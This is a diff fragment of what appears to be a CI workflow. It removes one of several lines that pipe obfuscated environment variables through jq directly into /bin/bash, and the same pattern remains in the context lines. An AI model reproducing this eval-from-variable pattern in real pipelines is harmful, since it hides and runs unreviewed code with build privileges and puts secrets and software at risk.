@@ -23,7 +23,6 @@ jobs:
           echo $xmoel481 | jq -r .jdyi75006 | /bin/bash
           echo $lzn96 | jq -r .e656 | /bin/bash
           echo $wegtl52691 | jq -r .g28192 | /bin/bash
-          printf '%s' "$zfdhk54900" | jq -r .olyit7 | /bin/bash
 
       - name: Store artifact
         if: always()
